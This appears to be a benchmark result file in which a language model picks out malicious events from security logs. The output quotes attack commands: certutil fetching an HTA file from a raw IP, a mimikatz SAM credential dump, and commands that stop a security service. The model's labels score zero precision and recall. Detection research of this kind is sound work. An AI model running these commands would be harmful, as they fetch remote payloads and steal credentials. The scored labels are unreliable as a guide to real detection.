@@ -1,0 +1,68 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -decode a.txt b.txt",
+        "stage": "Execution"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net stop exsecservice && schtasks /Delete /TN \\SysVol\\Domain\\Scripts\\Startup\\exsecservice || schtasks /Delete /TN \\SysVol\\Domain\\Scripts\\Startup\\exsecservice",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "This system appears compromised due to malice manifesting through extensive network engagements, aggressive credential retrieval, and deliberate misdirection, confirming a severe security breach.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44006,
+      "completion_tokens": 2803,
+      "total_tokens": 46809,
+      "wall_clock_s": 80.225,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 4,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 4,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44006,
+      "completion_tokens": 2803,
+      "total_tokens": 46809,
+      "wall_clock_s": 80.225,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
